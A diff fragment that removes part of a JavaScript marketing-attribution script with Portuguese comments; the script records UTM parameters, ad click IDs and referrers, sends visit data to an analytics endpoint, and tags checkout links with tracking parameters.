-  function limpa(v,max){return String(v||'').toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-+|-+$/g,'').slice(0,max||28)}
-  function novoId(){return (Date.now().toString(36)+Math.random().toString(36).slice(2)).replace(/[^a-z0-9]/g,'').slice(-6)}
-  var q=new URLSearchParams(location.search);
-  function p(n){return q.get(n)||''}
-
-  // Rede pelo endereço da referência: o Instagram e o Facebook entregam o clique
-  // por l.instagram.com, lm.facebook.com etc., que antes viravam a origem "l".
-  function rede(h){
-    if(/(^|\.)instagram\.com$/.test(h)) return 'instagram';
-    if(/(^|\.)(facebook\.com|fb\.com|fb\.me|messenger\.com)$/.test(h)) return 'facebook';
-    return h.replace(/^(l|lm|m|mobile)\./,'').split('.')[0];
-  }
-
-  function origemDaURL(){
-    var s=p('utm_source'),m=p('utm_medium'),c=p('utm_campaign'),ct=p('utm_content');
-    if(!s&&!m&&!c){
-      var h='';
-      try{if(document.referrer)h=new URL(document.referrer).hostname.replace(/^www\./,'')}catch(e){}
-      if(p('gclid')){s='google';m='cpc'}
-      else if(p('ttclid')){s='tiktok';m='paid'}
-      // Todo anúncio da conta sai com UTM (utm_medium=paid). O Meta põe fbclid em
-      // qualquer clique que deixa o app (perfil, story, direct), então fbclid sem
-      // UTM é clique orgânico e nunca meta_paid (5 vendas assim em 24–25/09/2026).
-      else if(p('fbclid')){s=h&&h!==location.hostname?rede(h):'social';m='organico'}
-      else if(h){
-        if(h===location.hostname) return null;      // navegação interna não troca a origem
-        s=rede(h);m='referencia';
-      }
-      else{s='direto';m='direto'}
-    }
-    return [limpa(s)||'na',limpa(m)||'na',limpa(c)||'na',limpa(ct)||'na'].join('_').slice(0,80);
-  }
-
-  var guardado=function(k){try{return sessionStorage.getItem(k)||''}catch(e){return ''}};
-  var guardar=function(k,v){try{sessionStorage.setItem(k,v)}catch(e){}};
-
-  // Clique do Google Ads (gclid; no iPhone pode vir gbraid/wbraid). Vai junto no
-  // link do checkout para a tag de compra do Google Ads, que roda na Hotmart,
-  // achar o anúncio mesmo quando o cookie não atravessa o domínio.
-  var CLIQUES=['gclid','gbraid','wbraid'];
-  CLIQUES.forEach(function(n){if(p(n))guardar('ra_'+n,p(n))});
-
-  var temMarca=p('utm_source')||p('utm_medium')||p('utm_campaign')||p('fbclid')||p('gclid')||p('ttclid');
-  var origem=guardado(K_ORIGEM), id=guardado(K_ID), nova=false;
-
-  // Sessão nova, ou a pessoa voltou por outro caminho (clicou num anúncio depois
-  // de já ter entrado): origem e id se renovam juntos, senão a segunda visita
-  // apareceria com a origem da primeira.
-  if(temMarca||!origem||!id){
-    var calc=origemDaURL();
-    if(calc){origem=calc;id=novoId();nova=true;guardar(K_ORIGEM,origem);guardar(K_ID,id)}
-  }
-  if(!origem||!id) return;
-  var sck=(origem+'_v'+id).slice(0,100);
-  window.__raOrigem=sck; window.__raVisita=id;
-
-  if(nova){
-    var visita={id:id,site:location.hostname,pagina:location.pathname,sck:sck,
-      utm_source:p('utm_source'),utm_medium:p('utm_medium'),utm_campaign:p('utm_campaign'),
-      utm_content:p('utm_content'),utm_term:p('utm_term'),
-      fbclid:p('fbclid'),gclid:p('gclid'),ttclid:p('ttclid'),referencia:document.referrer||''};
-    var corpo=JSON.stringify(visita);
-    try{
-      // text/plain de propósito: é o único tipo que o sendBeacon manda para outro
-      // domínio SEM preflight. Com application/json o navegador pede OPTIONS, o
-      // beacon não sabe esperar e a visita some em silêncio (aconteceu aqui).
-      if(!(navigator.sendBeacon&&navigator.sendBeacon(API,new Blob([corpo],{type:'text/plain;charset=UTF-8'}))))
-        fetch(API,{method:'POST',headers:{'Content-Type':'text/plain;charset=UTF-8'},body:corpo,keepalive:true}).catch(function(){});
-    }catch(e){}
-  }
-
-  function marca(a){
-    try{
-      var u=new URL(a.getAttribute('href'),location.href);
-      if(u.hostname!=='pay.wiapy.com') return;
-      if(!u.searchParams.get('sck')) u.searchParams.set('sck',sck);
-      if(!u.searchParams.get('xcod')) u.searchParams.set('xcod',id);
-      CLIQUES.forEach(function(n){var v=guardado('ra_'+n);if(v&&!u.searchParams.get(n))u.searchParams.set(n,v)});
-      a.setAttribute('href',u.toString());
-    }catch(e){}
-  }
-  function todos(){Array.prototype.forEach.call(document.querySelectorAll('a[href*="pay.wiapy.com"]'),marca)}
-  // Captura no documento: pega até os CTAs que só ganham href depois da carga.
-  document.addEventListener('click',function(ev){
-    var a=ev.target&&ev.target.closest?ev.target.closest('a[href*="pay.wiapy.com"]'):null;
-    if(a) marca(a);
-  },true);
-  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',todos);else todos();
-})();
-</script>
 
 
 
